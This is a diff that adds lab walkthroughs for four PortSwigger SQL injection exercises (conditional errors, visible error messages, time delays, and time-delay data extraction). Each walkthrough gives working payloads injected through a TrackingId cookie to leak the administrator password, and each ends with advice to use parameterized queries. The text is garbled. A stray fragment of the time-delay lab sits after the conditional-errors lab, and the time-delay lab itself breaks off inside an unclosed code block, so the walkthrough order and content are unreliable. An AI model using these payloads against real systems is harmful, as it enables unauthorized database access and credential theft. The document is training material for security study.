@@ -301,3 +301,125 @@ SELECT tracking-id FROM TrackedUsers WHERE tracking-id = 'xyz123' AND (SELECT 'a
 
 ---
 
+### [PS-SQLi-12] Blind SQL injection with conditional errors
+
+**Scenario:** The application uses a `TrackingId` cookie inside a database query and suppresses query results and detailed database messages, but returns an HTTP error (such as `500 Internal Server Error`) when an injected SQL expression triggers a runtime error. By crafting conditional error expressions—such as dividing by zero or forcing a type-conversion failure only when a condition evaluates to true—you can infer whether the `administrator` account exists, determine password length, and extract the password character by character.
+
+**Solution:**
+
+1. Browse the target application and capture an HTTP request in Burp Suite that includes the `TrackingId` cookie (for example, `TrackingId=xyz123`).
+2. Send the request to Burp Repeater and test how the application reacts to a deliberate SQL syntax or runtime error versus a normal request, confirming whether error-inducing expressions produce a distinct error response (such as a `500` status code).
+3. Use a conditional error expression—such as a `CASE WHEN <condition> THEN TO_CHAR(1/0) ELSE NULL END` (Oracle) or a conditional divide-by-zero / cast error—to verify the `administrator` row and test password length thresholds:
+
+```http
+GET / HTTP/1.1
+Host: target.web-security-academy.net
+Cookie: TrackingId=xyz123'%7C%7C(SELECT+CASE+WHEN+(username%3D%27administrator%27+AND+LENGTH(password)%3E19)+THEN+TO_CHAR(1%2F0)+ELSE+NULL+END+FROM+users)--+
+
+
+
+```
+
+4. Observe how the conditional error triggers inside the injected expression when the condition holds true:
+
+```sql
+SELECT tracking_id FROM tracked_users WHERE tracking_id = 'xyz123'||(SELECT CASE WHEN (username='administrator' AND LENGTH(password)>19) THEN TO_CHAR(1/0) ELSE NULL END FROM users)--'
+
+```
+
+5. Repeat the conditional error pattern with substring/character checks (`SUBSTR` or `SUBSTRING`) across each character position using Burp Intruder or an automated script to extract the full `administrator` password, then log in via the account page.
+
+> **Key Takeaway:** Even when neither query output nor conditional text appears on screen, HTTP errors caused by conditional runtime exceptions act as a side channel in blind SQL injection. Parameterized queries prevent untrusted cookie input from altering query structure or evaluating injected conditional expressions.
+
+---
+
+```
+
+3. Observe how the injected expression executes inside the backend query and pauses execution for 10 seconds before returning the response:
+
+```sql
+SELECT tracking_id FROM tracked_users WHERE tracking_id = 'xyz123'||pg_sleep(10)--'
+
+```
+
+4. Confirm in Burp Repeater's response timer (bottom right) that the request takes ~10 seconds to complete, verifying time-based blind SQL injection. *(Note: Lab 14 only requires triggering the 10-second delay; extracting data via conditional delays is covered in Lab 15.)*
+
+> **Key Takeaway:** Even when an application suppresses all output and error messages, synchronous SQL execution lets time-delay functions act as a reliable detection side channel. Parameterized queries prevent untrusted cookie values from altering query structure or invoking database functions.
+
+### [PS-SQLi-13] Visible error-based SQL injection *(Revised with PortSwigger Examples)*
+
+**Scenario:** The application concatenates a `TrackingId` cookie directly into a backend query and reflects verbose database error messages in the HTTP response without displaying query results. By injecting a subquery inside a type-casting expression (`CAST((SELECT ...) AS int)`), you can force PostgreSQL to throw an `invalid input syntax for type integer` error that echoes the returned string value directly in the error message.
+
+**Solution:**
+
+1. Capture a request with the `TrackingId` cookie in Burp Suite, send it to Repeater, and append a single quote (`TrackingId=xyz123'`) to confirm an unterminated string error appears in the response, then restore syntax with a comment (`TrackingId=xyz123'--`).
+2. Test extracting a single value by injecting `AND CAST((SELECT 1) AS int)--`, then replace `SELECT 1` with `SELECT username FROM users LIMIT 1`—removing the original `xyz123` cookie value if the backend truncates the `TrackingId` field length:
+
+```http
+GET / HTTP/1.1
+Host: target.web-security-academy.net
+Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--; session=abc123
+
+
+
+```
+
+3. Observe how the database evaluates the inner subquery and fails while casting the string `'administrator'` to an integer, leaking the value in the error text:
+
+```sql
+SELECT tracking_id FROM tracked_users WHERE tracking_id = '' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--'
+
+```
+
+4. Once the error message confirms `administrator` is the first row (`ERROR: invalid input syntax for type integer: "administrator"`), swap `username` for `password` (`' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`) to leak the password in the error response, then log in as `administrator`.
+
+> **Key Takeaway:** Verbose database error messages turn type-conversion failures into a direct data-exfiltration channel when normal query output is hidden. Parameterized queries and generic production error handling prevent untrusted input from altering query structure or exposing database internals.
+
+---
+
+### [PS-SQLi-14] Blind SQL injection with time delays
+
+**Scenario:** The application embeds a `TrackingId` cookie inside a backend database query, executes the query synchronously, and returns identical HTTP responses regardless of query results or SQL errors. By injecting a database-specific time-delay expression (such as `pg_sleep(10)` in PostgreSQL), you can induce a measurable 10-second pause in the server's HTTP response, proving that injected SQL executes.
+
+**Solution:**
+
+1. Browse the shop application and capture a request containing the `TrackingId` cookie in Burp Suite (for example, `TrackingId=xyz123`), then send it to Repeater.
+2. Append a string concatenation operator and a time-delay function call (`'||pg_sleep(10)--`) to the `TrackingId` cookie value and send the request:
+
+```http
+GET / HTTP/1.1
+Host: target.web-security-academy.net
+Cookie: TrackingId=xyz123'%7C%7Cpg_sleep(10)--; session=abc123
+
+---
+
+### [PS-SQLi-15] Blind SQL injection with time delays and information retrieval
+
+**Scenario:** The application uses a `TrackingId` cookie inside a synchronous PostgreSQL query and returns identical responses regardless of query results or errors. By combining a conditional check (`CASE WHEN ... THEN pg_sleep(10) ELSE pg_sleep(0) END`) with string-length and substring functions, you can verify the `administrator` account, find the password length, and extract each character based on whether the response takes ~10 seconds.
+
+**Solution:**
+
+1. Browse the shop application and capture a request containing the `TrackingId` cookie in Burp Suite (for example, `TrackingId=xyz123`), then send it to Repeater.
+2. Confirm the `administrator` user exists by gating `pg_sleep(10)` inside a `CASE` expression (`'%3BSELECT+CASE+WHEN+(username%3D%27administrator%27)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`), then determine the password length by testing length thresholds such as `LENGTH(password)>19` vs. `LENGTH(password)>20`:
+
+```http
+GET / HTTP/1.1
+Host: target.web-security-academy.net
+Cookie: TrackingId=xyz123'%3BSELECT+CASE+WHEN+(username%3D%27administrator%27+AND+LENGTH(password)>19)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--; session=abc123
+
+
+
+```
+
+3. Observe how the conditional branch triggers the 10-second delay inside the backend query only when the condition holds true:
+
+```sql
+SELECT tracking_id FROM tracked_users WHERE tracking_id = 'xyz123';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>19) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--'
+
+```
+
+4. Once the password length is confirmed (20 characters), use Burp Intruder or an automated loop over positions `1` through `20` and alphanumeric characters (`a-z`, `0-9`, etc.) with `SUBSTRING(password, <pos>, 1) = '<char>'` inside the `CASE` condition, measuring ~10-second responses to reconstruct the `administrator` password and log in.
+
+> **Key Takeaway:** Pairing conditional logic with time-delay functions turns response latency into a bit-by-bit extraction channel even when neither output nor errors are visible. Parameterized queries prevent untrusted cookie input from altering query structure or conditionally invoking sleep functions.
+
+---
